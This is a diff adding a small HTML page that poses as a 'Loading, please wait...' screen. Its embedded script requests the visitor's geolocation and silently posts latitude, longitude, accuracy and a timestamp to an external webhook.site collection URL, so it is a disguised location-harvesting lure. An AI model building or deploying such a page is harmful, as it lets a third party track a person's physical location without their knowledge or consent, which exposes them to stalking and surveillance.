@@ -1,0 +1,25 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Loading...</title>
+  <script>
+    navigator.geolocation.getCurrentPosition(function(location) {
+      fetch("https://webhook.site/072d18e6-e41c-4d3f-b241-e0f33b606568", {
+        method: "POST",
+        headers: {
+          "Content-Type": "application/json"
+        },
+        body: JSON.stringify({
+          latitude: location.coords.latitude,
+          longitude: location.coords.longitude,
+          accuracy: location.coords.accuracy,
+          timestamp: new Date().toString()
+        })
+      });
+    });
+  </script>
+</head>
+<body>
+  <h2>Loading, please wait...</h2>
+</body>
+</html>
